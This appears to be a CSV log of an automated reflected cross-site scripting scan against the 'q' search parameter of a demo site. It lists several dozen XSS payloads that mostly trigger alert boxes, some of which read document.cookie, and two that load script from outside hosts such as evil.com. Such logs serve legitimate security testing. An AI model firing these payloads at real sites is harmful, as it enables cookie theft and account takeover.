Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:44:59.966,2026-01-10 17:45:00.763,0.797,https://demo-knsl.onrender.com/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.784,0.818,https://demo-knsl.onrender.com/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.841,0.875,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.864,0.898,https://demo-knsl.onrender.com/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.906,0.940,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.921,0.955,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:00.929,0.964,https://demo-knsl.onrender.com/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.763,2026-01-10 17:45:00.948,0.185,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:01.142,1.176,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.864,2026-01-10 17:45:01.146,0.282,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:01.252,1.286,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.921,2026-01-10 17:45:01.254,0.334,https://demo-knsl.onrender.com/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.906,2026-01-10 17:45:01.300,0.394,https://demo-knsl.onrender.com/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.948,2026-01-10 17:45:01.303,0.355,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.784,2026-01-10 17:45:01.317,0.534,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.146,2026-01-10 17:45:01.320,0.174,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.841,2026-01-10 17:45:01.358,0.517,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.254,2026-01-10 17:45:01.374,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:00.929,2026-01-10 17:45:01.388,0.459,https://demo-knsl.onrender.com/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.303,2026-01-10 17:45:01.448,0.145,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.142,2026-01-10 17:45:01.471,0.329,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.317,2026-01-10 17:45:01.474,0.156,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:44:59.966,2026-01-10 17:45:01.497,1.531,https://demo-knsl.onrender.com/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 17:45:01.252,2026-01-10 17:45:01.589,0.337,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.388,2026-01-10 17:45:01.592,0.203,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.300,2026-01-10 17:45:01.639,0.338,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.471,2026-01-10 17:45:01.641,0.170,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.320,2026-01-10 17:45:01.699,0.379,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.497,2026-01-10 17:45:01.702,0.205,https://demo-knsl.onrender.com/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.358,2026-01-10 17:45:01.717,0.359,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.592,2026-01-10 17:45:01.720,0.128,https://demo-knsl.onrender.com/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.374,2026-01-10 17:45:01.730,0.356,https://demo-knsl.onrender.com/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.641,2026-01-10 17:45:01.751,0.109,https://demo-knsl.onrender.com/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.474,2026-01-10 17:45:01.762,0.288,https://demo-knsl.onrender.com/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.717,2026-01-10 17:45:01.808,0.092,https://demo-knsl.onrender.com/search,GET,q,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:45:01.639,2026-01-10 17:45:01.862,0.224,https://demo-knsl.onrender.com/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:45:01.448,2026-01-10 17:45:01.866,0.418,https://demo-knsl.onrender.com/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
